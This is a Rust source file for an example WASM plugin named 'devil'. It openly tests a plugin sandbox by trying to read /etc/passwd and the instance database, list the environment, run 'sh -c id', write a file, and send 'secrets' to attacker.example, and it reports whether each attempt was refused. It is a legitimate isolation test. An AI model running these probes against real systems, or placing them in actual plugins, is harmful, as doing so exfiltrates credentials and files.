//! devil, an example plugin in Rust: it tries, in plain sight, what a plugin must never do: read the instance's files
//! and the server's, see the environment (where secrets live), run a command (what $os.cmd does in pb_hooks), write a
//! file, and send what it found to attacker.example. Each try says "refused: <why>" or "GOT: <what>". Under ext/wasm
//! every one is refused: the plugin is a closed box, JSON in and JSON out, and nothing else exists for it.
//!
//!   stdin:  {"steal": "/etc/passwd", "sendTo": "attacker.example:443"}   (both optional)
//!
//! Build: cargo build --release --target wasm32-wasip1
use serde_json::{json, Map, Value};
use std::io::{Read, Write};
use std::{env, fs, net, process};

fn main() {
    // the function asked for: --describe prints the manifest (plugin.json beside the source); "run" is the only other
    match std::env::args().nth(1).as_deref() {
        Some("--describe") => {
            print!("{}", include_str!("../plugin.json"));
            return;
        }
        Some("run") => {}
        other => {
            eprint!("{}", json!({ "code": "no_such_function", "message": other.unwrap_or("") }));
            std::process::exit(1)
        }
    }
    let mut raw = String::new();
    std::io::stdin().read_to_string(&mut raw).ok();
    let input: Value = serde_json::from_str(&raw).unwrap_or(json!({}));
    let steal = input["steal"].as_str().unwrap_or("/etc/passwd");
    let send_to = input["sendTo"].as_str().unwrap_or("attacker.example:443");

    let mut got = Map::new();
    let mut tried = |what: String, r: Result<String, String>| {
        got.insert(what, match r { Ok(s) => format!("GOT: {s}"), Err(e) => format!("refused: {e}") }.into());
    };

    // the files: the one asked for, the instance's database, the folders
    tried(format!("read {steal}"), fs::read(steal).map(|b| format!("{} bytes", b.len())).map_err(|e| e.to_string()));
    tried("read pb_data/data.db".into(), fs::read("pb_data/data.db").map(|b| format!("{} bytes", b.len())).map_err(|e| e.to_string()));
    for dir in ["/", "."] {
        tried(format!("list {dir}"), fs::read_dir(dir).map(|d| format!("{} entries", d.count())).map_err(|e| e.to_string()));
    }
    tried("write pwned.txt".into(), fs::write("pwned.txt", "pwned").map(|_| "written".into()).map_err(|e| e.to_string()));

    // the environment, where the secrets are (API keys, FLOW_PRIVATE_KEY...)
    let vars: Vec<String> = env::vars().map(|(k, _)| k).collect();
    tried("environment".into(), if vars.is_empty() { Err("empty: no variables".into()) } else { Ok(vars.join(", ")) });

    // a command, as $os.cmd would run it
    tried("run sh -c id".into(), process::Command::new("sh").args(["-c", "id"]).output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).map_err(|e| e.to_string()));

    // the network: find attacker.example, connect, send what was found
    let host = send_to.split(':').next().unwrap_or(send_to);
    tried(format!("resolve {host}"), net::ToSocketAddrs::to_socket_addrs(send_to)
        .map(|a| a.map(|a| a.to_string()).collect::<Vec<_>>().join(", ")).map_err(|e| e.to_string()));
    tried(format!("send to {send_to}"), net::TcpStream::connect(send_to)
        .and_then(|mut c| c.write_all(b"POST /loot HTTP/1.0\r\n\r\nsecrets"))
        .map(|_| "sent".into()).map_err(|e| e.to_string()));

    let escaped = got.values().filter(|v| v.as_str().is_some_and(|s| s.starts_with("GOT"))).count();
    let verdict = if escaped == 0 { "nothing got out of the box".to_string() } else { format!("{escaped} ways out!") };
    let why = "a plugin gets stdin, stdout and stderr, nothing else: no files, no environment, no processes, no network";
    print!("{}", json!({ "tried": got, "verdict": verdict, "why": why }));
}
